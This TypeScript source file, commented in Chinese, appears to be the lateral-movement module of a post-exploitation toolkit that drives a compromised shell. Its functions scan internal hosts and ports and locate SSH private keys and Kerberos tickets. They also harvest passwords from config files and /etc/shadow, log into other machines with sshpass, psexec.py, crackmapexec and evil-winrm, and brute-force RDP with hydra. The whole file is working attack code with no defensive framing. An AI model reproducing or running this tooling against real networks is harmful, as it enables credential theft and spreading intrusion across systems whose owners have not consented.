import { executeCommand } from '../../core/shell';
import { ToolResult } from '../../core/types';
import * as fs from 'fs/promises';
import * as path from 'path';

/**
 * 内网主机发现 - 使用多种方法发现存活主机
 */
export async function discoverInternalHosts(
  shellId: string,
  sessionDir: string,
  subnet: string = '192.168.1.0/24'
): Promise<ToolResult<{ hosts: Array<{ ip: string; hostname?: string; mac?: string; os?: string }> }>> {
  try {
    const outputFile = path.join(sessionDir, `internal_hosts_${Date.now()}.txt`);

    // 使用多种方法发现主机
    const commands = [
      // ARP扫描（最快，但仅限本地网段）
      `arp -a | grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}' > ${outputFile}`,
      // Ping扫描
      `for i in {1..254}; do (ping -c 1 -W 1 ${subnet.split('/')[0].split('.').slice(0,3).join('.')}.$i | grep "64 bytes" &); done | grep -oE '([0-9]{1,3}\\.){3}[0-9]{1,3}' >> ${outputFile}`,
      // 检查/proc/net/arp
      `cat /proc/net/arp 2>/dev/null | awk '{print $1}' >> ${outputFile}`,
      // 使用nmap（如果可用）
      `which nmap && nmap -sn ${subnet} -oG - | grep "Up" | awk '{print $2}' >> ${outputFile} || true`
    ];

    for (const cmd of commands) {
      await executeCommand(shellId, cmd);
    }

    // 读取并去重
    const result = await executeCommand(shellId, `sort -u ${outputFile} | grep -E '^([0-9]{1,3}\\.){3}[0-9]{1,3}$'`);
    const ips = result.output.trim().split('\n').filter(ip => ip && ip !== '0.0.0.0');

    // 尝试获取主机名和MAC地址
    const hosts = await Promise.all(ips.map(async (ip) => {
      const hostnameResult = await executeCommand(shellId, `host ${ip} 2>/dev/null | grep "domain name pointer" | awk '{print $NF}' | sed 's/\\.$//'`);
      const macResult = await executeCommand(shellId, `arp -a ${ip} 2>/dev/null | grep -oE '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}'`);

      return {
        ip,
        hostname: hostnameResult.output.trim() || undefined,
        mac: macResult.output.trim() || undefined
      };
    }));

    return {
      success: true,
      data: { hosts },
      message: `发现 ${hosts.length} 个内网主机`
    };
  } catch (error) {
    return {
      success: false,
      error: `内网主机发现失败: ${error}`
    };
  }
}

/**
 * 端口扫描 - 扫描目标主机开放端口
 */
export async function scanHostPorts(
  shellId: string,
  sessionDir: string,
  targetIp: string,
  ports: string = '21,22,23,80,135,139,443,445,1433,3306,3389,5432,5985,5986,8080'
): Promise<ToolResult<{ openPorts: Array<{ port: number; service: string; banner?: string }> }>> {
  try {
    const outputFile = path.join(sessionDir, `ports_${targetIp}_${Date.now()}.txt`);

    // 尝试使用nc进行端口扫描
    const portList = ports.split(',');
    const openPorts: Array<{ port: number; service: string; banner?: string }> = [];

    for (const port of portList) {
      const result = await executeCommand(
        shellId,
        `timeout 2 bash -c "echo > /dev/tcp/${targetIp}/${port}" 2>/dev/null && echo "open" || echo "closed"`,
        { timeout: 3000 }
      );

      if (result.output.includes('open')) {
        // 尝试获取banner
        const bannerResult = await executeCommand(
          shellId,
          `timeout 2 bash -c "echo | nc -w 1 ${targetIp} ${port}" 2>/dev/null | head -n 1`,
          { timeout: 3000 }
        );

        openPorts.push({
          port: parseInt(port),
          service: getServiceName(parseInt(port)),
          banner: bannerResult.output.trim() || undefined
        });
      }
    }

    return {
      success: true,
      data: { openPorts },
      message: `发现 ${openPorts.length} 个开放端口`
    };
  } catch (error) {
    return {
      success: false,
      error: `端口扫描失败: ${error}`
    };
  }
}

/**
 * SSH密钥收集 - 收集所有用户的SSH私钥
 */
export async function collectSSHKeys(
  shellId: string,
  sessionDir: string
): Promise<ToolResult<{ keys: Array<{ user: string; keyPath: string; keyType: string; publicKey?: string }> }>> {
  try {
    const outputFile = path.join(sessionDir, `ssh_keys_${Date.now()}.txt`);

    // 搜索所有用户的SSH私钥
    const result = await executeCommand(
      shellId,
      `find /home /root -name "id_rsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null`
    );

    const keyPaths = result.output.trim().split('\n').filter(p => p);
    const keys = await Promise.all(keyPaths.map(async (keyPath) => {
      const user = keyPath.split('/')[2] || 'root';
      const keyType = path.basename(keyPath).replace('id_', '');

      // 尝试读取公钥
      const pubKeyResult = await executeCommand(shellId, `cat ${keyPath}.pub 2>/dev/null`);

      // 检查私钥权限
      const permResult = await executeCommand(shellId, `ls -l ${keyPath} | awk '{print $1}'`);

      return {
        user,
        keyPath,
        keyType,
        publicKey: pubKeyResult.output.trim() || undefined,
        permissions: permResult.output.trim()
      };
    }));

    return {
      success: true,
      data: { keys },
      message: `收集到 ${keys.length} 个SSH密钥`
    };
  } catch (error) {
    return {
      success: false,
      error: `SSH密钥收集失败: ${error}`
    };
  }
}

/**
 * 凭据收集 - 从配置文件、历史记录等收集凭据
 */
export async function harvestCredentials(
  shellId: string,
  sessionDir: string
): Promise<ToolResult<{ credentials: Array<{ type: string; username: string; password?: string; hash?: string; source: string }> }>> {
  try {
    const credentials: Array<{ type: string; username: string; password?: string; hash?: string; source: string }> = [];

    // 搜索常见配置文件中的密码
    const configPatterns = [
      { file: '/etc/passwd', type: 'system_user' },
      { file: '/etc/shadow', type: 'password_hash' },
      { file: '~/.bash_history', type: 'history' },
      { file: '~/.mysql_history', type: 'mysql_history' },
      { file: '~/.ssh/config', type: 'ssh_config' },
      { file: '/var/www/html/config.php', type: 'web_config' },
      { file: '/var/www/html/wp-config.php', type: 'wordpress' },
      { file: '/etc/mysql/my.cnf', type: 'mysql_config' }
    ];

    // 搜索密码关键字
    const passwordSearch = await executeCommand(
      shellId,
      `grep -r -i "password\\|passwd\\|pwd" /home /var/www /opt 2>/dev/null | grep -E "(password|passwd|pwd)\\s*=\\s*['\\\"]?[^'\\\"\\s]+" | head -n 50`
    );

    const passwordLines = passwordSearch.output.trim().split('\n').filter(l => l);
    for (const line of passwordLines) {
      const match = line.match(/(password|passwd|pwd)\s*=\s*['"]?([^'"\\s]+)/i);
      if (match) {
        credentials.push({
          type: 'plaintext_password',
          username: 'unknown',
          password: match[2],
          source: line.split(':')[0]
        });
      }
    }

    // 读取shadow文件（如果有权限）
    const shadowResult = await executeCommand(shellId, `cat /etc/shadow 2>/dev/null`);
    if (shadowResult.exitCode === 0) {
      const shadowLines = shadowResult.output.trim().split('\n');
      for (const line of shadowLines) {
        const parts = line.split(':');
        if (parts.length >= 2 && parts[1] && parts[1] !== '*' && parts[1] !== '!') {
          credentials.push({
            type: 'shadow_hash',
            username: parts[0],
            hash: parts[1],
            source: '/etc/shadow'
          });
        }
      }
    }

    return {
      success: true,
      data: { credentials },
      message: `收集到 ${credentials.length} 个凭据`
    };
  } catch (error) {
    return {
      success: false,
      error: `凭据收集失败: ${error}`
    };
  }
}

/**
 * SSH横向移动 - 使用SSH密钥或密码尝试登录目标主机
 */
export async function attemptSSHLateral(
  shellId: string,
  sessionDir: string,
  targetIp: string,
  username: string,
  authMethod: { type: 'key' | 'password'; value: string }
): Promise<ToolResult<{ success: boolean; newShellId?: string; output: string }>> {
  try {
    if (authMethod.type === 'key') {
      // 使用SSH密钥
      const keyFile = path.join(sessionDir, `temp_key_${Date.now()}`);
      await executeCommand(shellId, `echo "${authMethod.value}" > ${keyFile} && chmod 600 ${keyFile}`);

      const result = await executeCommand(
        shellId,
        `ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -i ${keyFile} ${username}@${targetIp} "whoami && id"`,
        { timeout: 10000 }
      );

      // 清理临时密钥
      await executeCommand(shellId, `rm -f ${keyFile}`);

      if (result.exitCode === 0) {
        return {
          success: true,
          data: {
            success: true,
            output: result.output,
            newShellId: `ssh_${targetIp}_${username}_${Date.now()}`
          },
          message: `SSH登录成功: ${username}@${targetIp}`
        };
      }
    } else {
      // 使用密码（需要sshpass）
      const result = await executeCommand(
        shellId,
        `which sshpass && sshpass -p "${authMethod.value}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 ${username}@${targetIp} "whoami && id" || echo "sshpass not found"`,
        { timeout: 10000 }
      );

      if (result.exitCode === 0 && !result.output.includes('sshpass not found')) {
        return {
          success: true,
          data: {
            success: true,
            output: result.output,
            newShellId: `ssh_${targetIp}_${username}_${Date.now()}`
          },
          message: `SSH登录成功: ${username}@${targetIp}`
        };
      }
    }

    return {
      success: true,
      data: {
        success: false,
        output: 'SSH登录失败'
      },
      message: 'SSH登录失败'
    };
  } catch (error) {
    return {
      success: false,
      error: `SSH横向移动失败: ${error}`
    };
  }
}

/**
 * SMB横向移动 - 使用psexec/smbexec进行Windows横向移动
 */
export async function attemptSMBLateral(
  shellId: string,
  sessionDir: string,
  targetIp: string,
  username: string,
  password: string,
  domain: string = '.'
): Promise<ToolResult<{ success: boolean; newShellId?: string; output: string }>> {
  try {
    // 尝试使用impacket的psexec.py
    const result = await executeCommand(
      shellId,
      `which psexec.py && psexec.py ${domain}/${username}:${password}@${targetIp} "whoami" || echo "psexec not found"`,
      { timeout: 15000 }
    );

    if (result.exitCode === 0 && !result.output.includes('psexec not found')) {
      return {
        success: true,
        data: {
          success: true,
          output: result.output,
          newShellId: `smb_${targetIp}_${username}_${Date.now()}`
        },
        message: `SMB登录成功: ${domain}\\${username}@${targetIp}`
      };
    }

    // 尝试使用crackmapexec
    const cmexecResult = await executeCommand(
      shellId,
      `which crackmapexec && crackmapexec smb ${targetIp} -u ${username} -p ${password} -d ${domain} -x "whoami" || echo "crackmapexec not found"`,
      { timeout: 15000 }
    );

    if (cmexecResult.exitCode === 0 && !cmexecResult.output.includes('crackmapexec not found')) {
      return {
        success: true,
        data: {
          success: true,
          output: cmexecResult.output,
          newShellId: `smb_${targetIp}_${username}_${Date.now()}`
        },
        message: `SMB登录成功: ${domain}\\${username}@${targetIp}`
      };
    }

    return {
      success: true,
      data: {
        success: false,
        output: 'SMB登录失败或工具不可用'
      },
      message: 'SMB登录失败'
    };
  } catch (error) {
    return {
      success: false,
      error: `SMB横向移动失败: ${error}`
    };
  }
}

/**
 * WinRM横向移动 - 使用WinRM进行Windows远程管理
 */
export async function attemptWinRMLateral(
  shellId: string,
  sessionDir: string,
  targetIp: string,
  username: string,
  password: string,
  domain: string = '.'
): Promise<ToolResult<{ success: boolean; newShellId?: string; output: string }>> {
  try {
    // 使用evil-winrm
    const result = await executeCommand(
      shellId,
      `which evil-winrm && evil-winrm -i ${targetIp} -u ${username} -p ${password} -e "whoami" || echo "evil-winrm not found"`,
      { timeout: 15000 }
    );

    if (result.exitCode === 0 && !result.output.includes('evil-winrm not found')) {
      return {
        success: true,
        data: {
          success: true,
          output: result.output,
          newShellId: `winrm_${targetIp}_${username}_${Date.now()}`
        },
        message: `WinRM登录成功: ${domain}\\${username}@${targetIp}`
      };
    }

    return {
      success: true,
      data: {
        success: false,
        output: 'WinRM登录失败或工具不可用'
      },
      message: 'WinRM登录失败'
    };
  } catch (error) {
    return {
      success: false,
      error: `WinRM横向移动失败: ${error}`
    };
  }
}

/**
 * RDP暴力破解 - 尝试RDP登录
 */
export async function attemptRDPBrute(
  shellId: string,
  sessionDir: string,
  targetIp: string,
  username: string,
  passwords: string[]
): Promise<ToolResult<{ success: boolean; validPassword?: string; output: string }>> {
  try {
    // 使用hydra进行RDP暴力破解
    const passwordFile = path.join(sessionDir, `rdp_passwords_${Date.now()}.txt`);
    await executeCommand(shellId, `echo "${passwords.join('\n')}" > ${passwordFile}`);

    const result = await executeCommand(
      shellId,
      `which hydra && hydra -l ${username} -P ${passwordFile} -t 4 rdp://${targetIp} || echo "hydra not found"`,
      { timeout: 60000 }
    );

    await executeCommand(shellId, `rm -f ${passwordFile}`);

    if (result.output.includes('password:')) {
      const match = result.output.match(/password:\s*(\S+)/);
      return {
        success: true,
        data: {
          success: true,
          validPassword: match ? match[1] : undefined,
          output: result.output
        },
        message: `RDP密码破解成功: ${username}@${targetIp}`
      };
    }

    return {
      success: true,
      data: {
        success: false,
        output: result.output
      },
      message: 'RDP密码破解失败'
    };
  } catch (error) {
    return {
      success: false,
      error: `RDP暴力破解失败: ${error}`
    };
  }
}

/**
 * Kerberos票据收集 - 收集Kerberos票据用于Pass-the-Ticket
 */
export async function collectKerberosTickets(
  shellId: string,
  sessionDir: string
): Promise<ToolResult<{ tickets: Array<{ user: string; ticketPath: string; service?: string }> }>> {
  try {
    // 搜索ccache文件
    const result = await executeCommand(
      shellId,
      `find /tmp /var/tmp /home -name "*.ccache" -o -name "krb5cc_*" 2>/dev/null`
    );

    const ticketPaths = result.output.trim().split('\n').filter(p => p);
    const tickets = ticketPaths.map(ticketPath => {
      const user = ticketPath.includes('krb5cc_')
        ? ticketPath.split('krb5cc_')[1]
        : 'unknown';

      return {
        user,
        ticketPath
      };
    });

    return {
      success: true,
      data: { tickets },
      message: `收集到 ${tickets.length} 个Kerberos票据`
    };
  } catch (error) {
    return {
      success: false,
      error: `Kerberos票据收集失败: ${error}`
    };
  }
}

/**
 * 内网服务枚举 - 枚举目标主机上运行的服务
 */
export async function enumerateRemoteServices(
  shellId: string,
  sessionDir: string,
  targetIp: string
): Promise<ToolResult<{ services: Array<{ port: number; service: string; version?: string; vulns?: string[] }> }>> {
  try {
    // 使用nmap进行服务版本探测
    const result = await executeCommand(
      shellId,
      `which nmap && nmap -sV -T4 --top-ports 100 ${targetIp} -oG - || echo "nmap not found"`,
      { timeout: 120000 }
    );

    if (result.output.includes('nmap not found')) {
      return {
        success: false,
        error: 'nmap工具不可用'
      };
    }

    // 解析nmap输出
    const services: Array<{ port: number; service: string; version?: string }> = [];
    const lines = result.output.split('\n');

    for (const line of lines) {
      const match = line.match(/(\d+)\/open\/tcp\/\/([^\/]+)\/\/([^\/]+)/);
      if (match) {
        services.push({
          port: parseInt(match[1]),
          service: match[2],
          version: match[3]
        });
      }
    }

    return {
      success: true,
      data: { services },
      message: `枚举到 ${services.length} 个服务`
    };
  } catch (error) {
    return {
      success: false,
      error: `服务枚举失败: ${error}`
    };
  }
}

/**
 * 辅助函数：根据端口号获取服务名
 */
function getServiceName(port: number): string {
  const serviceMap: { [key: number]: string } = {
    21: 'ftp',
    22: 'ssh',
    23: 'telnet',
    80: 'http',
    135: 'msrpc',
    139: 'netbios-ssn',
    443: 'https',
    445: 'microsoft-ds',
    1433: 'mssql',
    3306: 'mysql',
    3389: 'rdp',
    5432: 'postgresql',
    5985: 'winrm-http',
    5986: 'winrm-https',
    8080: 'http-proxy'
  };

  return serviceMap[port] || 'unknown';
}
